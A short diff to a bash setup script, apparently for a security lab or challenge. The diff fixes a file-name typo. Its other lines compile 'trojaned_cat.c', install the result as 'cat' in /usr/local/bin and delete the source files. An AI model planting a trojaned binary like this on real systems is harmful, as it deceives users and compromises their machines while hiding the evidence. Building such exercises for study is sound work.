@@ -1,7 +1,7 @@
 #!/bin/bash
 cd files
 gcc -o mystery mystery.c
-rm myster.c
+rm mystery.c
 gcc -o cat trojaned_cat.c
 mv cat /usr/local/bin
 rm trojaned_cat.c
